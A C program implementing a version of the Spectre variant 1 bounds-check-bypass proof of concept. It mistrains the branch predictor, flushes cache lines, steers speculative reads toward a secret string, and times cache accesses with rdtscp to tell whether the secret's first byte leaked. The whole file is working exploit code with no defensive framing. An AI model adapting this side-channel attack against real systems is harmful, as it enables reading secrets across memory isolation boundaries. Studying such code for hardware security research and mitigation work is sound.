#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <x86intrin.h>
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256*512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp=0;
void victim_function(size_t x){ if(x<array1_size){ temp &= array2[array1[x]*512]; } }
int main(){
  for(size_t i=0;i<sizeof(array2);i++) array2[i]=1;
  size_t malicious_x=(size_t)(secret-(char*)array1);
  uint8_t target = secret[0]; // 'T'=0x54
  // collect time2 for the target index and for a decoy, over many tries
  long sum_t=0,n_t=0,sum_o=0,n_o=0; unsigned junk=0;
  register uint64_t t1,t2; volatile uint8_t*addr;
  for(int tries=2000;tries>0;tries--){
    for(int i=0;i<256;i++) _mm_clflush(&array2[i*512]);
    size_t training_x=tries%array1_size, x;
    for(int j=29;j>=0;j--){ _mm_clflush(&array1_size);
      for(volatile int z=0;z<100;z++){}
      x=((j%6)-1)&~0xFFFF; x=(x|(x>>16)); x=training_x^(x&(malicious_x^training_x));
      victim_function(x);
    }
    for(int i=0;i<256;i++){ int mix=((i*167)+13)&255; addr=&array2[mix*512];
      t1=__rdtscp(&junk); junk=*addr; t2=__rdtscp(&junk)-t1;
      if(mix==target){sum_t+=t2;n_t++;} else {sum_o+=t2;n_o++;}
    }
  }
  printf("target idx 0x%02X avg time=%.1f (n=%ld)\n",target,(double)sum_t/n_t,n_t);
  printf("other idxs       avg time=%.1f (n=%ld)\n",(double)sum_o/n_o,n_o);
  return junk&1;
}
